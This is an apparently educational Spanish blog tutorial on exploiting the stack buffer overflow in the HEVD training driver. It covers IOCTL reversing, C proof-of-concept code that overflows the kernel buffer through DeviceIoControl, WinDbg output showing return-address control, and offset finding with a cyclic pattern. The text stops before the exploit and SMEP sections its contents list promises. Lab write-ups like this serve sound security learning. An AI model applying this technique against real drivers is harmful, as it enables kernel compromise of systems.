<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>HEVD: Stack Overflow</title>

  <meta name="description" content="Explotación de Stack Overflow en modo kernel">
  <meta name="author" content="DarthBear">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="HEVD: Stack Overflow">
  <meta name="twitter:description" content="Explotación de Stack Overflow en modo kernel">
  <meta name="twitter:creator" content="DarthBear">  
  <meta name="twitter:image" content="/exploit-development/windows-kernel/stack-overflow/image.png" />

  <meta property="og:site_name" content="DarthBear" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="HEVD: Stack Overflow">
  <meta property="og:description" content="Explotación de Stack Overflow en modo kernel">
  <meta property="og:image" content="/exploit-development/windows-kernel/stack-overflow/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploit-development/windows-kernel/stack-overflow/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="HEVD: Stack Overflow" href="/feed.xml">
</head>

  <body style="background-color: #282828;">

    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="DarthBear">
          <h1 class="panel-cover__title panel-title scale-up-center">DarthBear</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploit-development/windows-kernel" title="DarthBear" class="blog-button">Windows Kernel Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">

              <li class="navigation__item grow">
                <a href="https://github.com/kevincillo32" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://x.com/Bear00652327128" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/kevinch1106" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://www.youtube.com/@darthbear3654" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:kevincillo32@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#reversing">Reversing</a></li>
        <li><a href="#crashing">Crashing</a></li>
        <li><a href="#offset">Offset</a></li>
        <li><a href="#exploit">Exploit</a></li>
        <li><a href="#smep">SMEP</a></li>
    </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploit-development/windows-kernel/stack-overflow/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">HEVD: Stack Overflow</h2><br>
  </header>

<p class="plain-text">En este post se llevara a cabo la explotación de una de las vulnerabilidades del driver <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a>, en este caso iniciaremos con lo mas sencillo, un Stack Overflow que es una de las vulnerabilidades conocidas pero esta vez se explotará a nivel de kernel.</p>

<section class="post" id="reversing">
<br><h3 class="post-title">Reversing</h3><br>    

<p class="plain-text">Lo primero es entender como podemos comunicarnos con el driver, hay que entender que no podemos acceder a la memoria del espacio kernel sin embargo existe una interfaz del sistema operativo que permite esta comunicación, estas son las llamadas <code class="language-plaintext highlighter-rouge">ioctl</code>, cuando se instala un driver establece un nombre de dispositivo llamando a la función <code class="language-plaintext highlighter-rouge">IoCreateDevice</code>, utilizando IDA podemos desensamblar el driver y ver esta llamada en el bloque <code class="language-plaintext highlighter-rouge">DriverEntry</code>, el nombre es <code class="language-plaintext highlighter-rouge">\\.\HackSysExtremeVulnerableDriver</code></p>
<a href="/exploit-development/windows-kernel/stack-overflow/1.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/1.png"></p></div></a>

<p class="plain-text">Cada función se identifica con un código <code class="language-plaintext highlighter-rouge">ioctl</code>, el driver acepta las llamadas usando estructuras <code class="language-plaintext highlighter-rouge">IRP</code>, o <code class="language-plaintext highlighter-rouge">I/O Request Packets</code>, en este caso podemos ver una función almacenada en la tercera entrada del objeto llamada <code class="language-plaintext highlighter-rouge">IrpDeviceIoCtlHandler</code></p>
<a href="/exploit-development/windows-kernel/stack-overflow/8.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/8.png"></p></div></a>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">IrpDeviceIoCtlHandler</code> es la encargada de llamar a determinada función dependiendo de su código <code class="language-plaintext highlighter-rouge">ioctl</code>, para ello utiliza una estructura tipo <code class="language-plaintext highlighter-rouge">switch</code></p>
<a href="/exploit-development/windows-kernel/stack-overflow/7.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/7.png"></p></div></a>

<p class="plain-text">Entre multiples comparaciones se muestra el código <code class="language-plaintext highlighter-rouge">ioctl</code> perteneciente a cada función, en este caso nos interesa la que pertenece al código <code class="language-plaintext highlighter-rouge">0x222003</code></p>
<a href="/exploit-development/windows-kernel/stack-overflow/2.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/2.png"></p></div></a>

<p class="plain-text">Siguiendo la flecha verde podemos ver que es el bloque encargado de llamar a una función con el nombre <code class="language-plaintext highlighter-rouge">BufferOverflowStackIoctlHandler</code> que tiene la vulnerabilidad</p>
<a href="/exploit-development/windows-kernel/stack-overflow/3.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/3.png"></p></div></a>

<p class="plain-text">Esta función simplemente se encarga de llamar a <code class="language-plaintext highlighter-rouge">TriggerBuffferOverflowStack</code> pasandole un buffer que sera nuestra entrada y el tamaño de este</p>
<a href="/exploit-development/windows-kernel/stack-overflow/4.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/4.png"></p></div></a>

<p class="plain-text">En la función <code class="language-plaintext highlighter-rouge">TriggerBufferOverflowStack</code> podemos ver que se llama a <code class="language-plaintext highlighter-rouge">memset</code> para reservar un espacio en memoria de tamaño <code class="language-plaintext highlighter-rouge">0x800</code> o <code class="language-plaintext highlighter-rouge">2048</code> en decimal</p>
<a href="/exploit-development/windows-kernel/stack-overflow/5.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/5.png"></p></div></a>

<p class="plain-text">Finalmente se llama a una función llamada <code class="language-plaintext highlighter-rouge">memmove</code>, pasando como destino el buffer reservado al inicio de la función y como fuente nuestro buffer introducido</p>
<a href="/exploit-development/windows-kernel/stack-overflow/6.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/6.png"></p></div></a>

</section>
<section class="post" id="crashing">
<br><h3 class="post-title">Crashing</h3><br>

<p class="plain-text">Utilizando <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> podemos comunicarnos pasandole el handle y el código <code class="language-plaintext highlighter-rouge">ioctl</code> perteneciente a la función, además de ello el <code class="language-plaintext highlighter-rouge">buffer</code> que le pasaremos y su tamaño, el resto de parámetros los dejaremos como <code class="language-plaintext highlighter-rouge">NULL</code> ya que no nos interesan</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">BOOL </span><span class="na">DeviceIoControl</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">HANDLE</span><span class="p">       hDevice,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        dwIoControlCode,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">optional</span><span class="p">]      </span><span class="no">LPVOID</span><span class="p">       lpInBuffer,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        nInBufferSize,
  [</span><span class="mi">out</span><span class="p">, </span><span class="mi">optional</span><span class="p">]     </span><span class="no">LPVOID</span><span class="p">       lpOutBuffer,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        nOutBufferSize,
  [</span><span class="mi">out</span><span class="p">, </span><span class="mi">optional</span><span class="p">]     </span><span class="no">LPDWORD</span><span class="p">      lpBytesReturned,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">out</span><span class="p">,</span><span class="mi"> optional</span><span class="p">] </span><span class="no">LPOVERLAPPED</span><span class="p"> lpOverlapped
);</span>
</code></pre></div></div><br>

<p class="plain-text">En un proyecto de <code class="language-plaintext highlighter-rouge">Visual Studio</code> definimos el siguiente código, iniciamos definiendo un buffer llamado <code class="language-plaintext highlighter-rouge">payload</code> con un tamaño de <code class="language-plaintext highlighter-rouge">2500</code> bytes, (un poco más del buffer definido) el cual rellenaremos con <code class="language-plaintext highlighter-rouge">A's</code>, luego de eso lo enviamos al controlador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include</span><span class="s"> &ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>

</span><span class="no">int </span><span class="na">main</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> payload </span><span class="o">= </span><span class="p">VirtualAlloc(</span><span class="mi">NULL</span><span class="p">, </span><span class="mi">2500</span><span class="p">, MEM_COMMIT </span><span class="o">|</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlFillMemory(payload, </span><span class="mi">2500</span><span class="p">, </span><span class="s">'A'</span><span class="p">);

    </span><span class="na">HANDLE</span><span class="p"> handle </span><span class="o">= </span><span class="p">CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  

    </span><span class="o">if </span><span class="p">(handle </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">puts</span><span class="p">(</span><span class="s">"[-] Failed to get handle"</span><span class="p">);
        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
    }

    DeviceIoControl(handle, </span><span class="mi">0x222003</span><span class="p">, payload, </span><span class="mi">2500</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Para ver lo que está haciendo el ultimo bloque reverseado estableceremos un <code class="language-plaintext highlighter-rouge">breakpoint</code> en la llamada a <code class="language-plaintext highlighter-rouge">memmove</code> y continuaremos la ejecución normal</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">bp HEVD!TriggerBufferOverflowStack + 0xca  

</span><span class="ro">0: kd> </span><span class="p">g</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de compilar el proyecto nuestro exploit nos queda en un <code class="language-plaintext highlighter-rouge">.exe</code> que ejecutamos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">exploit.exe  </span>
</code></pre></div></div><br>

<p class="plain-text">Volviendo al debugger podemos ver que en el kernel hemos alcanzado el <code class="language-plaintext highlighter-rouge">breakpoint</code> a la llamada, sin embargo se nos revela que no es a <code class="language-plaintext highlighter-rouge">memmove</code> sino a <code class="language-plaintext highlighter-rouge">memcpy</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
HEVD!TriggerBufferOverflowStack+0xca:
fffff806`7d68667e e83dabf7ff      call    HEVD!memcpy (fffff806`7d6011c0)  </span>
</code></pre></div></div><br>

<p class="plain-text">Según la documentación oficial de Microsoft, la función <a href="https://learn.microsoft.com/es-es/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170">memcpy</a> recibe 3 argumentos, un puntero al buffer de destino, un puntero al source y un contador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">void </span><span class="o">*</span><span class="na">memcpy</span><span class="p">(
    </span><span class="no">void </span><span class="o">*</span><span class="p">dest,
    </span><span class="o">const </span><span class="no">void </span><span class="o">*</span><span class="p">src,  
    </span><span class="na">size_t </span><span class="p">count
);</span>
</code></pre></div></div><br>

<p class="plain-text">Las <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">convenciones de llamada</a> en x64 nos dicen que los primeros 3 argumentos deberian estar en los registros <code class="language-plaintext highlighter-rouge">rcx</code>, <code class="language-plaintext highlighter-rouge">rdx</code> y <code class="language-plaintext highlighter-rouge">r8</code>, en <code class="language-plaintext highlighter-rouge">rcx</code> podemos ver el destino, en <code class="language-plaintext highlighter-rouge">rdx</code> el source o lo que se va a copiar y en <code class="language-plaintext highlighter-rouge">r8</code> el contador que son <code class="language-plaintext highlighter-rouge">2500</code> bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">db rcx L40
ffff888c`00994f70  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................    
ffff888c`00994f80  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................    
ffff888c`00994f90  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................    
ffff888c`00994fa0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................    

</span><span class="ro">0: kd></span><span class="p"> db rdx L40
00000195`19c80000  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA    
00000195`19c80010  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA    
00000195`19c80020  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA    
00000195`19c80030  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA    

</span><span class="ro">0: kd></span><span class="p"> ? r8
Evaluate expression: 2500 = 00000000`000009c4</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de ejecutar la llamada podemos ver que el contenido del buffer se ha copiado al destino, sin embargo hay que recordar que cuando reverseamos el bloque el buffer definido era de apenas <code class="language-plaintext highlighter-rouge">2048</code> bytes y nosotros hemos escrito un total de <code class="language-plaintext highlighter-rouge">2500</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">p
HEVD!TriggerBufferOverflowStack+0xcf:
fffff806`7d686683 eb1b            jmp     HEVD!TriggerBufferOverflowStack+0xec (fffff806`7d6866a0)  

</span><span class="ro">0: kd></span><span class="p"> db rcx L40
ffff888c`00994f70  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffff888c`00994f80  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffff888c`00994f90  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffff888c`00994fa0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span>
</code></pre></div></div><br>

<p class="plain-text">Avanzamos hazta el siguiente <code class="language-plaintext highlighter-rouge">ret</code> donde podemos ver que hemos sobrescrito la dirección de retorno con <code class="language-plaintext highlighter-rouge">0x4141414141414141</code> que es igual a las <code class="language-plaintext highlighter-rouge">A's</code> en hexadecimal, si intentamos continuar provocará un error ya que esa dirección no existe, de esta forma controlamos la dirección donde apuntará mediante un <code class="language-plaintext highlighter-rouge">Stack Buffer Overflow</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">pt
HEVD!TriggerBufferOverflowStack+0x10b:
fffff806`7d6866bf c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L1
ffff888c`00995788  41414141`41414141

</span><span class="ro">0: kd></span><span class="p"> p
Access violation - code c0000005 (!!! second chance !!!)  
HEVD!TriggerBufferOverflowStack+0x10b:
fffff806`7d6866bf c3              ret</span>
</code></pre></div></div><br>

</section>
<section class="post" id="offset">
<br><h3 class="post-title">Offset</h3><br>

<p class="plain-text">Para encontrar la cantidad de bytes necesarios antes de sobrescribir la dirección de retorno crearemos un patrón de caractéres utilizando <code class="language-plaintext highlighter-rouge">cyclic</code> de pwntools</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cyclic </span><span class="p">-n 8 2500
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaafdaaaaaafeaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafraaaaaafsaaaaaaftaaaaaafuaaaaaafvaaaaaafwaaaaaafxaaaaaafyaaaaaafzaaaaaagbaaaaaagcaaaaaagdaaaaaageaaaaaagfaaaaaaggaaaaaaghaaaaaagiaaaaaagjaaaaaagkaaaaaaglaaaaaagmaaaaaagnaaaaaagoaaaaaagpaaaaaagqaaaaaagraaaaaagsaaaaaagtaaaaaaguaaaaaagvaaaaaagwaaaaaagxaaaaaagyaaaaaagzaaaaaahbaaaaaahcaaaaaahdaaaaaaheaaaaaahfaaaaaahgaaaaaahhaaaaaahiaaaaaahjaaaaaahkaaaaaahlaaaaaahmaaaaaahnaaaaaahoaaaaaahpaaaaaahqaaaaaahraaaaaahsaaaaaahtaaaaaahuaaaaaahvaaaaaahwaaaaaahxaaaaaahyaaaaaahzaaaaaaibaaaaaaicaaaaaaidaaaaaaieaaaaaaifaaaaaaigaaaaaaihaaaaaaiiaaaaaaijaaaaaaikaaaaaailaaaaaaimaaaaaainaaaaaaioaaaaaaipaaaaaaiqaaaaaairaaaaaaisaaaaaaitaaaaaaiuaaaaaaivaaaaaaiwaaaaaaixaaaaaaiyaaaaaaizaaaaaajbaaaaaajcaaaaaajdaaaaaajeaaaaaajfaaaaaajgaaaaaajhaaaaaajiaaaaaajjaaaaaajkaaaaaajlaaaaaajmaaaaaajnaaaaaajoaaaaaajpaaaaaajqaaaaaajraaaaaajsaaaaaajtaaaaaajuaaaaaajvaaaaaajwaaaaaajxaaaaaajyaaaaaajzaaaaaakbaaaaaakcaaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaaklaaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaakuaaaaaakvaaaaaakwaaaaaakxaaaaaakyaaaaaakzaaaaaalbaaaaaalcaaaaaaldaaaaaaleaaaaaalfaaaaaalgaaaaaalhaaaaaaliaaaaaaljaaaaaalkaaaaaallaaaaaalmaaaaaalnaaaaaaloaaaaaalpaaaaaalqaaaaaalraaaaaalsaaaaaaltaaaaaaluaaaaaalvaaaaaalwaaaaaalxaaaaaalyaaaaaalzaaaaaambaaaaaamcaaaaaamdaaaaaameaaaaaamfaaaaaamgaaaaaamhaaaaaamiaaaaaamjaaaaaamkaaaaaamlaaaaaammaaa  </span>
</code></pre></div></div><br>

<p class="plain-text">Ahora en lugar de rellenar el buffer payload con <code class="language-plaintext highlighter-rouge">A's</code> copiaremos los <code class="language-plaintext highlighter-rouge">2500</code> bytes creados con <code class="language-plaintext highlighter-rouge">cyclic</code> al buffer, después de ello compilamos el exploit</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include </span><span class="s">&ltstdio.h>

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">LPVOID </span><span class="p">payload </span><span class="o">= </span><span class="p">VirtualAlloc(</span><span class="mi">NULL</span><span class="p">, </span><span class="mi">2500</span><span class="p">, MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    </span><span class="o">const</span><span class="no"> char </span><span class="o">*</span><span class="p">cyclic </span><span class="o">= </span><span class="s">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaafdaaaaaafeaaaaaaffaaaaaafgaaaaaafhaaaaaafiaaaaaafjaaaaaafkaaaaaaflaaaaaafmaaaaaafnaaaaaafoaaaaaafpaaaaaafqaaaaaafraaaaaafsaaaaaaftaaaaaafuaaaaaafvaaaaaafwaaaaaafxaaaaaafyaaaaaafzaaaaaagbaaaaaagcaaaaaagdaaaaaageaaaaaagfaaaaaaggaaaaaaghaaaaaagiaaaaaagjaaaaaagkaaaaaaglaaaaaagmaaaaaagnaaaaaagoaaaaaagpaaaaaagqaaaaaagraaaaaagsaaaaaagtaaaaaaguaaaaaagvaaaaaagwaaaaaagxaaaaaagyaaaaaagzaaaaaahbaaaaaahcaaaaaahdaaaaaaheaaaaaahfaaaaaahgaaaaaahhaaaaaahiaaaaaahjaaaaaahkaaaaaahlaaaaaahmaaaaaahnaaaaaahoaaaaaahpaaaaaahqaaaaaahraaaaaahsaaaaaahtaaaaaahuaaaaaahvaaaaaahwaaaaaahxaaaaaahyaaaaaahzaaaaaaibaaaaaaicaaaaaaidaaaaaaieaaaaaaifaaaaaaigaaaaaaihaaaaaaiiaaaaaaijaaaaaaikaaaaaailaaaaaaimaaaaaainaaaaaaioaaaaaaipaaaaaaiqaaaaaairaaaaaaisaaaaaaitaaaaaaiuaaaaaaivaaaaaaiwaaaaaaixaaaaaaiyaaaaaaizaaaaaajbaaaaaajcaaaaaajdaaaaaajeaaaaaajfaaaaaajgaaaaaajhaaaaaajiaaaaaajjaaaaaajkaaaaaajlaaaaaajmaaaaaajnaaaaaajoaaaaaajpaaaaaajqaaaaaajraaaaaajsaaaaaajtaaaaaajuaaaaaajvaaaaaajwaaaaaajxaaaaaajyaaaaaajzaaaaaakbaaaaaakcaaaaaakdaaaaaakeaaaaaakfaaaaaakgaaaaaakhaaaaaakiaaaaaakjaaaaaakkaaaaaaklaaaaaakmaaaaaaknaaaaaakoaaaaaakpaaaaaakqaaaaaakraaaaaaksaaaaaaktaaaaaakuaaaaaakvaaaaaakwaaaaaakxaaaaaakyaaaaaakzaaaaaalbaaaaaalcaaaaaaldaaaaaaleaaaaaalfaaaaaalgaaaaaalhaaaaaaliaaaaaaljaaaaaalkaaaaaallaaaaaalmaaaaaalnaaaaaaloaaaaaalpaaaaaalqaaaaaalraaaaaalsaaaaaaltaaaaaaluaaaaaalvaaaaaalwaaaaaalxaaaaaalyaaaaaalzaaaaaambaaaaaamcaaaaaamdaaaaaameaaaaaamfaaaaaamgaaaaaamhaaaaaamiaaaaaamjaaaaaamkaaaaaamlaaaaaammaaa"</span><span class="p">;  
    RtlCopyMemory(payload, cyclic, </span><span class="mi">2500</span><span class="p">);

    </span><span class="na">HANDLE </span><span class="p">handle </span><span class="o">= </span><span class="p">CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">, GENERIC_READ </span><span class="o">| </span><span class="p">GENERIC_WRITE, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">if </span><span class="p">(handle </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">puts</span><span class="p">(</span><span class="s">"[-] Failed to get handle"</span><span class="p">);
        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
    }

    DeviceIoControl(handle, </span><span class="mi">0x222003</span><span class="p">, payload, </span><span class="mi">2500</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">El breakpoint ahora será directamente en el <code class="language-plaintext highlighter-rouge">ret</code> donde se prodice la vulnerabilidad</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
